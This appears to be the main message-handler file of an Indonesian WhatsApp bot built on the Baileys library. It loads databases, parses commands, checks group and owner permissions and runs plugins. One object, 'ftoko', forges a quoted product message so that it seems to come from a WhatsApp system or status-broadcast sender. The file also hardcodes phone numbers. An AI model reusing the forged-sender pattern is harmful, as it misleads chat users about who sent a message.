//Cek Credits ~> Thanks To
//Pena Bot ~> Combinate Based
//Full No encrypt

                                  let {
                                  WAConnection: _WAConnection,
                                  MessageType,
                                  Presence,
                                  MessageOptions,
                                  Mimetype,
                                  MimetypeMap,
                                  WALocationMessage,
                                  ChatModification,
                                  WA_MESSAGE_STUB_TYPES,
                                  WA_DEFAULT_EPHEMERAL,
                                  ReconnectMode,
                                  ProxyAgent,
                                  GroupSettingChange,
                                  waChatKey,
                                  mentionedJid,
                                  processTime,
                                  } = require ('@adiwajshing/baileys');
                  let { 
                  spawn, 
                  exec, 
                  execSync 
                  } = require ('child_process');
                                  let { 
                                  EmojiAPI 
                                  } = require ('emoji-api');
                  let { 
                  error
                  } = require ('qrcode-terminal');
    
                                  let { 
                                  isLimit, 
                                  limitAdd, 
                                  getLimit, 
                                  giveLimit, 
                                  addBalance, 
                                  kurangBalance, 
                                  getBalance, 
                                  isGame, 
                                  gameAdd, 
                                  givegame, 
                                  cekGLimit 
                                  } = require ('./lib/limit');
                  let {    
                  gamewaktu,
                  limitCount
                  } = require ('./database/settings')
                                  let { 
                                  fetxhText,  
                                  getBuffer, 
                                  getBase64, 
                                  getRandom, 
                                  start, 
                                  info, 
                                  success, 
                                  ucapanWaktu, 
                                  time, 
                                  date, 
                                  clock, 
                                  weton, 
                                  week, 
                                  calender, 
                                  countwaktu, 
                                  pad, 
                                  random, 
                                  isUrl, 
                                  math, 
                                  isNumber, 
                                  readmore, 
                                  nocache, 
                                  getGroupAdmins, 
                                  generateMessageID 
                                  } = require ('./lib/functions.js');
                  let { 
                  color, 
                  bgcolor 
                  } = require ('./lib/color');
                                  let { 
                                  fetcht, 
                                  kyun, 
                                  createExif 
                                  } = require ('./lib/fetcher');
                  let { 
                  yta, 
                  ytv, 
                  igdl, 
                  upload, 
                  formatDate 
                  } = require ('./lib/ytdl');
                                  let { 
                                  webp2mp4File 
                                  } = require ('./lib/webp2mp4');
                  let { 
                  bahasa 
                  } = require ('./lib/bahasa'); 
                                  let { 
                                  sleep, 
                                  isAfk, 
                                  cekafk, 
                                  addafk 
                                  } = require ('./lib/offline');
                  let { 
                  addCommands, 
                  checkCommands, 
                  deleteCommands 
                  } = require ('./lib/autoresp');
                                  let { 
                                  cmdadd 
                                  } = require ('./lib/totalcmd.js');
                  let { 
                  rules 
                  } = require ('./lib/rules');
                                  let { 
                                  addVote, 
                                  delVote 
                                  } = require ('./lib/vote');
                  let { 
                  jadibot, 
                  stopjadibot, 
                  listjadibot 
                  } = require ('./lib/jadibot');
                                  let { 
                                  mediafireDl 
                                  } = require ('./lib/mediafire')
                  let { 
                  ZippDL 
                  } = require ('./lib/zipydl')
                                  let {
                                  scommand, 
                                  addCmd, 
                                  getCommandPosition, 
                                  checkSCommand, 
                                  getCmd
                                  } = require ('./lib/stickCMD');
                  let {
                  _heal,
                  addHealUser,
                  healAdd,
                  bayarHeal
                  } = require ('./lib/heal');
                                  let {
                                  _potion, 
                                  bayarPotion, 
                                  addPotioUser, 
                                  potionAdd
                                  } = require ('./lib/potion');
                  let {
                  balance,
                  addATM, 
                  addKoinUser, 
                  checkATMuser, 
                  confirmATM
                  } = require ('./lib/ATM');
                                  let {
                                  _level,
                                  getLevelingXp, 
                                  getLevelingLevel, 
                                  levelRole,
                                  getLevelingId, 
                                  addLevelingXp, 
                                  addLevelingLevel, 
                                  addLevelingId, 
                                  isGained, 
                                  addCooldown
                                  } = require ('./lib/levelmode');
      
                  let hx = require (
                  'hxz-api'

                     );
                  let syntaxerror = require (
                  'syntax-error'

                     ); 
                  let yo = require (
                  'tod-api'

                     );
                  let qrcode = require (
                  'qrcode-terminal'

                     );
                  let moment = require (
                  'moment-timezone'

                     );
                  let speed = require (
                  'performance-now'
 
                     );
                  let crypto = require (
                  'crypto'

                     );
                  let request = require (
                  'request'
 
                     );
                  let util = require (
                  'util'

                     );
                  let fs = require (
                  'fs'
 
                     );
                  let iluminated = require (
                  'colors'

                     );
                  let axios = require (
                  'axios'

                     );
                  let ffmpeg = require (
                  'fluent-ffmpeg'
   
                     );
                  let ig = require (
                  'insta-fetcher'

                     );
                  let fetch = require (
                  'node-fetch'

                     );
                  let FormData = require (
                  'form-data'

                     );
                  let phoneNum = require (
                  'awesome-phonenumber'

                     );
                  let gis = require (
                  'g-i-s'

                     );
                  let got = require (
                  'got'

                     );
                  let imageToBase64 = require (
                  'image-to-base64'

                     );
                  let ID3Writer = require (
                  'browser-id3-writer'

                     );
                  let brainly = require (
                  'brainly-scraper'

                     );
                  let yts = require (
                  'yt-search'

                     );
                  let ms = require (
                  'parse-ms'

                     );
                  let toHur = require (
                  '@develoka/angka-terbilang-js'

                     );
                  let yargs = require (
                  'yargs/yargs'

                     );
                  let Math_js = require (
                  'mathjs'

                     );
                  let cheerio = require (
                  'cheerio'

                     );
                  let toMs = require (
                  'ms'

                     );
                  let conn = require (
                  './main'

                     );
                  let imgbb = require (
                  './imgbb-uploader'

                     );
                  let areatext = require (
                  './message/teks'

                     );
                  let reminder = require (
                  './lib/reminder'

                     );
                  let game = require (
                  './lib/game'

                     );
                  let simple = require (
                  './lib/simple.js'
                     );
                  let _prem = require (
                  './lib/premium'

                     ); 

                  let afk = JSON.parse(
                  fs.readFileSync(
                  './lib/off.json'
                     )
                  );
                                  let commandsDB = JSON.parse(
                                  fs.readFileSync(
                                  './database/commands.json'
                                     )
                                  );
                  let voting = JSON.parse(
                  fs.readFileSync(
                  './lib/voting.json'
                     )
                  );
                                  let limit = JSON.parse(
                                  fs.readFileSync(
                                  './database/limit.json'
                                     )
                                  );
                  let glimit = JSON.parse(
                  fs.readFileSync(
                  './database/glimit.json'
                     )
                  );
                                  let premium = JSON.parse(
                                  fs.readFileSync(
                                  './database/premium.json'
                                     )
                                  );
                  let setting = JSON.parse(
                  fs.readFileSync(
                  './database/settings.json'
                     )
                  );
                                  let pendaftar = JSON.parse(
                                  fs.readFileSync(
                                  './database/user.json'
                                     )
                                  );
                  let setik = JSON.parse(
                  fs.readFileSync(
                  './database/setik.json'
                     )
                  );
                                  let vien = JSON.parse(
                                  fs.readFileSync(
                                  './database/vien.json'
                                     )
                                  );
                  let imagi = JSON.parse(
                  fs.readFileSync(
                  './database/imagi.json'
                     )
                  );
                                  let bad = JSON.parse(
                                  fs.readFileSync(
                                  './database/bad.json'
                                     )
                                  );
                  let nsfw = JSON.parse(
                  fs.readFileSync(
                  './database/nsfw.json'
                     )
                  );
                                  let ban = JSON.parse(
                                  fs.readFileSync(
                                  './database/banned.json'
                                     )
                                  );
                  let register = JSON.parse(
                  fs.readFileSync(
                  './database/registered.json'
                     )
                  );
                                  let event = JSON.parse(
                                  fs.readFileSync(
                                  './database/event.json'
                                     )
                                  );
                  let mute = JSON.parse(
                  fs.readFileSync(
                  './database/mute.json'
                     )
                  );
                                  let _leveling = JSON.parse(
                                  fs.readFileSync(
                                  './database/leveling.json'
                                     )
                                  );
                  let _claim = JSON.parse(
                  fs.readFileSync(
                  './database/claim.json'
                     )
                  );
                                  let _registered = JSON.parse(
                                  fs.readFileSync(
                                  './database/registered.json'
                                     )
                                  );
                  let _reminder = JSON.parse(
                  fs.readFileSync(
                  './database/reminder.json'
                     )
                  );

                  let banChats = 
                  true;
                                  let offline = 
                                  false;
                  let autojoin = 
                  false;
                                  let prefixStatus = 
                                  true;

                  let hit_today = 
                  [];
                                  let tebakgambar = 
                                  [];
                  let family100 = 
                  [];
                                  let mtk = 
                                  []; 
                  let tebaklirik = 
                  [];  
                                  let siapaaku = 
                                  [];
                  let tebakkata = 
                  [];
                                  let tebakkimia = 
                                  [];
                  let tebakbendera = 
                  [];
                                  let tebakanime = 
                                  [];
                   
                 global.WAConnection = simple.WAConnection(
                  _WAConnection
                     );
                 global.arifi = new WAConnection(
                     );        
                 global.emoji = new EmojiAPI(
                     );
                  global.opts = new Object(
                  yargs(
                  process.argv.slice(
                  2)
                  ).exitProcess(
                  false).parse(
                     )
                  )
                  global.DATABASE = new (
                  require (
                  './lib/database'

                     )
                  )(`${opts._[0] ? opts._[0] + '_' : ''}database.json`, 
                  null, 
                  2)
              if (
              !global.DATABASE.data.users
              ) 
              global.DATABASE.data = { 
             users: {
             },
             sticker: {
             },
      }
      global.db = global.DATABASE
      global.db.user = global.db._data.users
    
                  global[
                  'get'

                  ] = {
                  };
                  global[
                  'get'

                  ][
                  'anu'

                  ] = JSON.parse(
                  fs.readFileSync(
                  './handler/setting/config.json'
                      )
                  );
                  global.bundle = global.get.anu.this.version.bot
                  global.baileys = global.get.anu.this.version.baileys
                  global.shp = global.get.anu.this.shp
                  global.Ponsel = global.get.anu.this.ponsel
                  global.helper = global.get.anu.this.helper
                  global.alasan = global.get.anu.this.undefined
                  global.g = global.get.anu.this.compossing
                  global.X = global.get.anu.this.silang
                  global.O = global.get.anu.this.bulat
                  global.waktu = global.get.anu.this.undefined
                  global.botUniversal = global.get.anu.packName
                  global.numberUsed = global.get.anu.ownerTunggal
                  global.ownerNumber = global.get.anu.ownerNumber
                  global.numberNon = global.get.anu.numberNon
                  global.watermark = global.get.anu.authName
                  global.namaowner = global.get.anu.ownernama
                  global.server = global.get.anu.ownerTunggal
                  global.tqto = global.get.anu.designbs
                  global.descBiz = global.get.anu.descpons
                  global.zeksapi = global.get.anu.APIs.zeksapi
                  global.lolkey = global.get.anu.APIs.lolhuman
                  global.dappakey = global.get.anu.APIs.dappakey
                  global.dhkey = global.get.anu.APIs.dhkey
                  global.aqulzkey = global.get.anu.APIs.aqulzkey
                  global.tobzkey = global.get.anu.APIs.tobzkey 
                  global.healawal = global.get.anu.tell.xxxiii
                  global.potionawal = global.get.anu.tell.xxxiii
                  global.numbernye = global.get.anu.tell.xx
                  global.targetpc = global.get.anu.tell.xx
                  global.unique = [ 
                  global.get.anu.style.satu, 
                  global.get.anu.style.dua, 
                  global.get.anu.style.tiga, 
                  global.get.anu.style.empat, 
                  global.get.anu.style.lima, 
                  global.get.anu.style.enam, 
                  global.get.anu.style.tujuh, 
                  global.get.anu.style.delapan, 
                  global.get.anu.style.sembilan, 
                  global.get.anu.style.sepuluh, 
                  global.get.anu.style.sebelas, 
                  global.get.anu.style.dua_belas, 
                  global.get.anu.style.tiga_belas, 
                  global.get.anu.style.empat_belas, 
                  global.get.anu.style.lima_belas, 
                  global.get.anu.style.enam_belas, 
                  global.get.anu.style.tujuh_belas, 
                  global.get.anu.style.delapan_belas, 
                  global.get.anu.style.sembilan_belas, 
                  global.get.anu.style.dua_puluh, 
                  global.get.anu.style.dua_puluh_satu, 
                  global.get.anu.style.dua_puluh_dua, 
                  global.get.anu.style.dua_puluh_tiga 
                  ];
                  
                  global[
                  'this'

                  ] = {
                  };
                  global[
                  'this'

                  ][
                  'socked'

                  ] = JSON.parse(
                  fs.readFileSync(
                  './handler/setting/server.json'
                      )
                  );
                  global.hosting1 = global.this.socked.Arifi
                  global.hosting2 = global.this.socked.Manik
                  global.hosting3 = global.this.socked.Denis
                  global.hosting4 = global.this.socked.Angga
                  global.hosting5 = global.this.socked.Dehante
                  global.hosting6 = global.this.socked.Ridho
                  global.hosting7 = global.this.socked.FG98
                  global.hosting8 = global.this.socked.FAX
                  global.hosting9 = global.this.socked.YogiPW
                          
                  global[
                  'super'

                  ] = {
                  };
                  global[
                  'super'

                  ][
                  'image'

                  ] = JSON.parse(
                  fs.readFileSync(
                  './handler/setting/fakeSet.json'
                       )
                   );
                  global.walpapper0 = global.super.image.pathThumbl
                  global.walpapper1 = global.super.image.pathImgStatus
                  global.walpapper2 = global.super.image.pathImgToko
                  global.walpapper3 = global.super.image.pathImgAdekKulitPutih
                  global.walpapper4 = global.super.image.pathMenu
                  global.walpapper5 = global.super.image.pathLogo
                  global.walpapper6 = global.super.image.pathOwnerFeat
                  global.walpapper7 = global.super.image.pathAdReply
                  global.walpapper8 = global.super.image.pathCadar
                  global.walpapper9 = global.super.image.pathUkhty
                  global.walpapper10 = global.super.image.pathSayangku
                  global.walpapper11 = global.super.image.pathself2
                  global.walpapper12 = global.super.image.pathself3
                  global.walpapper13 = global.super.image.pathself4
                  global.walpapper14 = global.super.image.pathself5
                  global.walpapper15 = global.super.image.pathself6
                  global.walpapper16 = global.super.image.pathself7
                  global.walpapper17 = global.super.image.pathself8
                  global.walpapper18 = global.super.image.pathself9

                                  let runtime = function (
                                  seconds) {
                                    seconds = Number(
                                    seconds);
                                    var d = Math.floor(
                                    seconds / (3600 * 24));
                                    var h = Math.floor(
                                    (seconds % (3600 * 24)) / 3600);
                                    var m = Math.floor(
                                    (seconds % 3600) / 60);
                                    var s = Math.floor(
                                    seconds % 60);
                                    var dDisplay = d > 0 ? d + (
                                    d == 1 ? ' hari, ' : ' Hari, ') : '';
                                    var hDisplay = h > 0 ? h + (
                                    h == 1 ? ' jam, ' : ' Jam, ') : '';
                                    var mDisplay = m > 0 ? m + (
                                    m == 1 ? ' menit, ' : ' Menit, ') : '';
                                    var sDisplay = s > 0 ? s + (
                                    s == 1 ? ' detik' : ' Detik') : '';
                                    return dDisplay + hDisplay + mDisplay + sDisplay;
                                  };
                                  
                  module.exports = 
                  conn.arifi = 
                  async (
                  arifi, rojak) => {
                    try {
                      if (
                      !rojak.hasNewMessage) return;
                      rojak = rojak.messages.all()[
                      0]; 
                      if (
                      !rojak.message) return;
                      if (
                      rojak.key && rojak.key.remoteJid == 'status@broadcast') return;
                      rojak.message =
                        Object.keys(
                        rojak.message)[
                        0] === 'ephemeralMessage'
                          ? rojak.message.ephemeralMessage.message
                          : rojak.message;
                  let m = simple.smsg(arifi, rojak);
                  let content = JSON.stringify(
                  rojak.message
                  );
                  
                  let from = rojak.key.remoteJid;
                  
                  let {
                  text,
                  extendedText,
                  contact,
                  location,
                  liveLocation,
                  image,
                  video,
                  sticker,
                  document,
                  audio,
                  product,
                  } = MessageType;
    
                  let type = Object.keys(
                  rojak.message)[
                  0];
                  1;
    
                                  var prefixRegEx = /^[!&z?=#.+\/]/gi;
    
                                  let _chats =
                                  type === 'conversation' && rojak.message.conversation
                                  ? rojak.message.conversation
                                  : type == 'imageMessage' && rojak.message.imageMessage.caption
                                  ? rojak.message.imageMessage.caption
                                  : type == 'videoMessage' && rojak.message.videoMessage.caption
                                  ? rojak.message.videoMessage.caption
                                  : type == 'extendedTextMessage' && rojak.message.extendedTextMessage.text
                                  ? rojak.message.extendedTextMessage.text
                                  : type == 'buttonsResponseMessage' && rojak.message[
                                  type].selectedButtonId
                                  ? rojak.message[type].selectedButtonId
                                  : type == 'stickerMessage' &&
                                  getCmd(rojak.message[
                                  type].fileSha256.toString(
                                  'base64')) !== null &&
                                  getCmd(rojak.message[
                                  type].fileSha256.toString(
                                  'base64')) !== undefined
                                  ? getCmd(rojak.message[
                                  type].fileSha256.toString(
                                  'base64'))
                                  : '';
        
                                      let prefix = 
                                      _chats.match(
                                      prefixRegEx) ? prefixRegEx.exec(
                                      _chats)[
                                      0] : '';
    
                                  let body =
                                  type === 'conversation' && rojak.message.conversation.startsWith(
                                  prefix)
                                  ? rojak.message.conversation
                                  : type == 'imageMessage' &&
                                  rojak.message.imageMessage.caption.startsWith(
                                  prefix)
                                  ? rojak.message.imageMessage.caption
                                  : type == 'videoMessage' &&
                                  rojak.message.videoMessage.caption.startsWith(
                                  prefix)
                                  ? rojak.message.videoMessage.caption
                                  : type == 'extendedTextMessage' &&
                                  rojak.message.extendedTextMessage.text.startsWith(
                                  prefix)
                                  ? rojak.message.extendedTextMessage.text
                                  : '';
                                  
                                  let budy = 
                                  type === 'conversation' 
                                  ? rojak.message.conversation 
                                  : type === 'extendedTextMessage' 
                                  ? rojak.message.extendedTextMessage.text 
                                  : ''

                                      let chats = _chats.match(
                                      prefixRegEx)
                                        ? _chats
                                            .split(
                                            prefixRegEx)
                                            .find((v) => v === _chats.replace(
                                            prefixRegEx, ''))
                                        : _chats;
            
    let command = chats.split(/ +/g)[0];
    hit_today.push(
    command);
    
    let args = _chats.trim().split(/ +/).slice(1);
    let commander = body.slice(1).trim().split(/ +/).shift().toLowerCase()
    let arg = budy.slice(
    commander.length + 2, budy.length)
    let isCmd = _chats.match(
    prefixRegEx)
      ? prefixRegEx.exec(
      _chats)['input']
      : _chats;
      
    let q = args.join(' ');
    let botNumber = arifi.user.jid;
    let botNumberss = arifi.user.jid + '@c.us';
    let isGroup = from.endsWith(
    '@g.us');
    let antilink = JSON.parse(
    fs.readFileSync(
    './database/antilink.json'
       )
    );
    let antivirtex = JSON.parse(
      fs.readFileSync(
      './database/antivirtex.json'
       )
    );
    
    let kickarea = JSON.parse(
    fs.readFileSync(
    './database/antibule.json'
       )
    );
    let antivo = JSON.parse(
    fs.readFileSync(
    './database/antivo.json'
       )
    );
    let antihidetg = JSON.parse(
      fs.readFileSync(
      './database/antihidetag.json'
       )
    );
    let isAntihidetag = 
    isGroup ? antihidetg.includes(
    from) 
    : false;
    let isAntiviewonce =
    isGroup ? antivo.includes(
    from) 
    : false;
    let isKickarea = 
    isGroup ? kickarea.includes(
    from) 
    : false;
    let isAntivirtex = 
    isGroup ? antivirtex.includes(
    from) 
    : false;
    let isAntilink = 
    isGroup ? antilink.includes(
    from) 
    : false;
    let isEventon = 
    isGroup ? event.includes(
    from) 
    : false
    let sender = 
    isGroup ? rojak.participant 
    : rojak.key.remoteJid
    
    let senderr = rojak.key.fromMe
      ? arifi.user.jid
      : isGroup
      ? rojak.participant
      : rojak.key.remoteJid;
      
    let ownerNumber2 =  [
    `${numberNon}@s.whatsapp.net`
    ]
    let isOwner = 
    ownerNumber2.includes(
    sender)
    let totalchat = 
    await arifi.chats.all();
    let groupMetadata = 
    isGroup ? await arifi.groupMetadata(
    from) 
    : '';
    let groupName = 
    isGroup ? groupMetadata.subject 
    : '';
    let groupId = 
    isGroup ? groupMetadata.jid 
    : '';
    let groupMembers = 
    isGroup ? groupMetadata.participants 
    : '';
    let groupDesc = 
    isGroup ? groupMetadata.desc 
    : '';
    let groupOwner = 
    isGroup ? groupMetadata.owner 
    : '';
    let groupAdmins = 
    isGroup ? getGroupAdmins(
    groupMembers) 
    : ''; 
    let isClaimOn = 
    _claim.includes(
    sender)
    let isBotGroupAdmins = 
    groupAdmins.includes(
    botNumber) || false;
    let isGroupAdmins = 
    groupAdmins.includes(
    sender) || false; 
    let isLevelingOn = 
    isGroup ? _leveling.includes(
    from) 
    : false
    let isVote = 
    isGroup ? voting.includes(
    from) 
    : false;
    let isNsfw = 
    isGroup ? nsfw.includes(
    from) 
    : false;
    let isBanned = 
    ban.includes(
    sender) 
    let isMuted = 
    isGroup ? mute.includes(
    from) 
    : false
    let isPremium = 
    isOwner ? true 
    : _prem.checkPremiumUser(
    sender, premium)
    let isRegister = register.includes(sender)
    let gcounti = setting.gcount
    let gcount = isPremium ? gcounti.prem : gcounti.user  
    let senderName = await arifi.getName(sender)
    let senderBio = await arifi.getStatus(sender)
    
    let selectedButton = 
    type == 'buttonsResponseMessage' ? rojak.message.buttonsResponseMessage.selectedButtonId : ''
    let responseButton = 
    type == 'listResponseMessage' ? rojak.message.listResponseMessage.title : ''
    let butresx = 
    type === 'buttonsResponseMessage' ? rojak.message.buttonsResponseMessage.selectedDisplayText : ''
    let butt = 
    type == 'buttonsResponseMessage' ? rojak.message.buttonsResponseMessage.selectedButtonId : ''
    
    let q3 = Object.keys(rojak.message)[
    0] == 'buttonsResponseMessage' ? rojak.message.buttonsResponseMessage.selectedButtonId : ''
    
    let ftoko = { 
    key: { 
    fromMe: false, 
    participant: `0@s.whatsapp.net`, ...(from ? { 
    remoteJid: 'status@broadcast' } : {
    }) 
    }, message: { 
       'productMessage': { 
       'product': { 
       'productImage':{ 
         'mimetype': 'image/jpeg',
         'jpegThumbnail': fs.readFileSync(`./stik/fake.jpg`)
         },
            'title': `${watermark}`, 
            'description': 'f4 bot', 
            'currencyCode': 'MYR', 
            'priceAmount1000': '50000000', 
            'retailerId': 'f4 bot', 
            'productImageCount': 1
            }, 
               'businessOwnerJid': `60176849904@s.whatsapp.net`
               }
            }
        }
			
     let conts = rojak.key.fromMe
      ? arifi.user.jid
      : arifi.contacts[sender] || { notify: jid.replace(/@.+/, '') };
    
    let pushname = rojak.key.fromMe
      ? arifi.user.name
      : conts.notify || conts.vname || conts.name || '-';
    let readmore = '͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏';
    
    if (prefix && command) cmdadd();
    let totalhit = JSON.parse(fs.readFileSync('./lib/totalcmd.json'))[0]
      .totalcmd;
      
    let time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss');
    let jam = moment().tz('Asia/Jakarta').format('HH:mm:ss');
    let wita = moment.tz('Asia/Makassar').format('HH:mm:ss');
    let wit = moment.tz('Asia/Jayapura').format('HH:mm:ss');
    
    let d = new Date();
    let locale = 'id';
    let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime();
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    
    let week = d.toLocaleDateString(locale, { weekday: 'long' });
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric',
    });
    
    let waktu = d.toLocaleDateString(locale, {
      hour: 'numeric',
      minute: 'numeric',
      second: 'numeric',
    });
    
    let time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss');
    if (time2 < '24:59:00') {
      var ucapanWaktu = 'Selamat malam';
    }
    if (time2 < '19:00:00') {
      var ucapanWaktu = 'Selamat senja';
    }
    if (time2 < '18:00:00') {
      var ucapanWaktu = 'Selamat sore';
    }
    if (time2 < '15:00:00') {
      var ucapanWaktu = 'Selamat siang';
    }
    if (time2 < '11:00:00') {
      var ucapanWaktu = 'Selamat pagi';
    }
    if (time2 < '05:00:00') {
      var ucapanWaktu = 'Selamat malam';
    } 
      

    //MESS
    let mess = {
      wait: '```WAIT PROCESING```',
      success: '```SUCCSES```',
      me: '```Anda Tidak Dapat Mengakses Fitur Ini!```',
      wrongFormat: '```FORMAT THIS WRONG, CEK FOR MENU ON VALID```',
      limit: `Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
      nsfwoff: '```NSFW MODE```',  
      baned: `Pake Tu Ngotak Dong Ajg\nAwokawok Gua Banned:v!!`, 
      levelingNotOn: `Fitur leveling belum diaktifkan!`,
      doneOwner: `Sudah selesai, Owner-sama~`,
      claimOnAlready: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi di esok hari.`,
      error: {
        stick: '```NOT STICKER```',
        Iv: '```ERROR ONLY```',
      },
      only: {
        group: '```GROUP ONLY```',
        owner: '```OWNER ONLY```',
        ownerB: '```OWNER ONLY```',
        prem: '```ONLY VIP USER, CHAT FOR OWNER THIS BUY VIP```',
      },
    };   
    
let msg2 = m.message
let users = global.DATABASE._data.users[m.sender]
if (typeof users !== 'object') global.DATABASE._data.users[m.sender] = {}
if (users) {
if (!isNumber(users.level)) users.level = 0
if (!isNumber(users.balance)) users.balance = 0 
if (!isNumber(users.exp)) users.exp = 0 
if (!isNumber(users.afk)) users.afk = -1
if (!('afkReason' in users)) users.afkReason = ''
if (!('banned' in users)) users.banned = false
} else global.DATABASE._data.users[m.sender] = {
   pushname: m.pushname,
   balance: 0,
   level: 0,
   exp: 0,
   afk: -1,
   afkReason: '',
   banned: false,
}
await global.DATABASE.save()    
let thumb = await fs.readFileSync('./src/penabot.jpeg')
if (isCmd) {
try {
 var pp = await arifi.getProfilePicture(sender.split('@')[0])
} catch {
 var pp = await arifi.getProfilePicture('6281261324817')
}
 var foto = await getBuffer(pp)
};

        //plugins Loader
for (let name in global.plugins) {
plugin = global.plugins[name]
if (!plugin) continue
if (plugin.disabled) continue
if (!plugin.all) continue
if (typeof plugin.all !== 'function') continue
try {
await plugin.all.call(arifi, m, rojak)
} catch (e) {
if (typeof e === 'string') continue
console.error(e)
}
  }
